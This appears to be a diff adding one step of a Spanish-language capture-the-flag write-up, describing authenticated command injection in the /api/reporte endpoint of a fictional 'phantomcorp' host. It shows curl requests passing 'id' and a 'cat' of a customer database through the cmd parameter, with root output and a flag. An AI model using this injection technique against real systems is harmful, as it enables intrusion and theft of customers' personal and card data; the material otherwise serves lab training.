@@ -1,0 +1,15 @@
+# R4 — Impacto — RCE autenticado por el token looteado -> crown jewels
+# El endpoint /api/reporte pasa el parámetro `cmd` a la shell del sistema (command injection).
+
+# Prueba de ejecución de comandos (corre como root):
+$ curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+# Lectura de los datos de clientes (crown jewels):
+$ curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat%20/app/priv/clientes.db.txt"
+$ cat /app/priv/clientes.db.txt
+clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
+
+# Impacto total: ejecución de comandos como root y acceso a 48.210 registros de
+# clientes con nombre, DNI y tarjeta -> FLAG{final_crown_jewels}
